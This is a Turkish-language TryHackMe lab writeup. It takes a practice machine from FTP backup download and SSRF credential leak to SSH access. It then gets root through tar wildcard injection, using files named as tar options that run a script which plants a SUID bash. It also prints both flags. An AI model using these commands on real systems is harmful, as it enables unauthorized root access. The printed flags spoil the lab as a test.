# TryHackMe - Operation Coldstart Writeup

## Keşif

İlk olarak hedef sistemi Nmap ile taradım:

```bash
nmap -sS -A -p- 10.114.141.161
```

<img width="805" height="596" alt="nmap" src="https://github.com/user-attachments/assets/5eb61782-602c-4472-b154-5361646ec3d3" />

Tarama sonucunda başlıca **FTP**, **SSH** ve **HTTP** servislerinin açık olduğunu gördüm. İlk dikkatimi çeken servis, anonim erişime izin verme ihtimali nedeniyle FTP oldu. Bu yüzden doğrudan bağlanmayı denedim:

```bash
ftp 10.114.141.161
```

---

## FTP Enumerasyonu ve Dosya Analizi

FTP sunucusuna bağlandığımda dizin içerisinde `backup.tar.gz` isimli bir yedek dosyası bulunduğunu gördüm. Dosyayı kendi makineme indirdim:

```bash
get backup.tar.gz
```

<img width="889" height="431" alt="getbackup" src="https://github.com/user-attachments/assets/ab6665f5-eeb7-4d87-bf25-31091f2effeb" />

Ardından arşivi çıkardım:

```bash
tar -xvf backup.tar.gz
```

Arşivin içeriği şu şekildeydi:

```text
voltlabs-preview/
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
```

<img width="323" height="99" alt="backupçıkan" src="https://github.com/user-attachments/assets/efb00495-dac0-4d4c-80b2-67799ff16089" />

Dosyaları tek tek inceledim. Özellikle `app.py` ve `README.md`, uygulamanın yapısı hakkında önemli bilgiler içeriyordu. Kaynak kodunda uygulamanın kullandığı aşağıdaki dosyaya referans bulunduğunu gördüm:

```text
/opt/voltlabs-preview/admin_notes.txt
```

Ayrıca uygulamanın dahili olarak aşağıdaki host üzerinde çalıştığını da öğrendim:

```text
kestrel.thm
```

Bu bilgileri elde ettikten sonra `kestrel.thm` adresini hosts dosyama ekleyerek tarayıcı üzerinden ziyaret ettim.

---

## SSRF ile Bilgi Sızıntısı

<img width="1919" height="556" alt="site" src="https://github.com/user-attachments/assets/d8c9699f-9ff4-4d85-960f-8b70bbf331b3" />

Karşıma çıkan sayfa, bir URL girildiğinde hedef kaynağın içeriğini sunucu üzerinden getiriyordu. Sayfada yer alan **"internal tool"** ve **"do not expose externally"** ifadeleri, uygulamanın yalnızca dahili kullanım için tasarlandığını gösteriyordu. Ancak dış dünyaya açık olması nedeniyle bu özellik potansiyel bir **Server-Side Request Forgery (SSRF)** zafiyeti oluşturuyordu.

Kaynak kodunda bulunan bilgiler doğrultusunda uygulamanın yönetici notlarını görüntüleyen endpoint'e aşağıdaki isteği gönderdim:

```text
http://kestrel.thm/admin/notes
```

<img width="1919" height="503" alt="site2" src="https://github.com/user-attachments/assets/e16385f3-afa6-4158-ab60-621e951c1941" />

Normal şartlarda `/admin/notes` endpoint'i dış erişime kapalı olabilirdi. Ancak SSRF sayesinde uygulama isteği kendi adına gerçekleştirdi ve yönetici notlarının içeriğini görüntüleyebildim.

Bu notlar içerisinde SSH erişimi için gerekli kullanıcı bilgileri bulunuyordu.

---

## SSH ile Giriş ve User Flag

Elde ettiğim kimlik bilgileriyle SSH servisine bağlandım:

```bash
ssh webdev@10.114.141.161
```

Giriş başarılı olduktan sonra kullanıcı flag'ini okudum:

```bash
cat /user.txt
```

Çıktı:

```text
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

<img width="443" height="100" alt="flag1" src="https://github.com/user-attachments/assets/2ec0c12c-14ab-4397-aa14-65eecabbd0ec" />

---

## Cron Görevinin İncelenmesi

Sisteme erişim sağladıktan sonra her zaman olduğu gibi cron görevlerini incelemeye başladım.

`/etc/cron.d/` dizini altında dikkatimi çeken dosya:

```bash
cat /etc/cron.d/voltlabs-backup
```

<img width="617" height="213" alt="privesc" src="https://github.com/user-attachments/assets/fb9484f2-85b8-490e-bf9d-5af69a7b5679" />

Dosya incelendiğinde root kullanıcısına ait cron görevinin her dakika `/opt/backups` dizini içerisinde aşağıdaki komutu çalıştırdığı görüldü:

```bash
tar czf /var/backups/uploads.tgz *
```

Buradaki kritik nokta, `tar` komutunun dosya seçiminde `*` (wildcard) karakterini kullanmasıydı.

Shell, `tar` çalıştırılmadan önce `*` karakterini dizindeki tüm dosya isimleriyle genişletir. Eğer dizinde `--checkpoint=...` veya `--checkpoint-action=...` gibi seçenek ismine sahip dosyalar bulunursa, `tar` bunları normal dosya adı olarak değil komut satırı parametresi olarak yorumlar. Bu durum **Tar Wildcard Injection** zafiyetine yol açmaktadır.

---

## Tar Wildcard Injection ile Privilege Escalation

İlk olarak yedekleme dizinine geçtim:

```bash
cd /opt/backups
```

Ardından root yetkisiyle çalıştırılmasını istediğim script'i oluşturdum:

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
```

Burada `chmod +x` kullanılmasına gerek yoktur; çünkü script doğrudan çalıştırılmayacak, `sh shell.sh` şeklinde yorumlayıcı tarafından çalıştırılacaktır.

Daha sonra `tar` tarafından parametre olarak yorumlanacak dosyaları oluşturdum:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Cron görevi çalıştığında shell önce `*` karakterini bu dosya isimleriyle genişletti. Böylece `tar`, bu dosyaları normal dosya olarak değil kendi komut satırı parametreleri olarak değerlendirdi ve `shell.sh` dosyasını root yetkileriyle çalıştırdı.

Yaklaşık bir dakika sonra cron görevi tetiklendi ve payload başarıyla çalıştı.

Oluşan SUID bash dosyasını doğrulamak için:

```bash
ls -l /tmp/bash
```

<img width="814" height="214" alt="privesc2" src="https://github.com/user-attachments/assets/d638511e-a1e1-4f13-b855-9e79d837be2b" />

Dosyanın root kullanıcısına ait olduğu ve SUID bitinin başarıyla ayarlandığı görüldü.

---

## Root Erişimi ve Root Flag

SUID bitli bash'i aşağıdaki komutla çalıştırdım:

```bash
/tmp/bash -p
```

Buradaki `-p` parametresi, Bash'in efektif kullanıcı kimliğini düşürmesini engelleyerek SUID yetkilerinin korunmasını sağlar.

Root kabuğunu elde ettikten sonra son flag'i okudum:

```bash
cd /root
cat flag.txt
```

Çıktı:

```text
THM{e6ee84a483d67ade06936fcfd1433e8a}
```
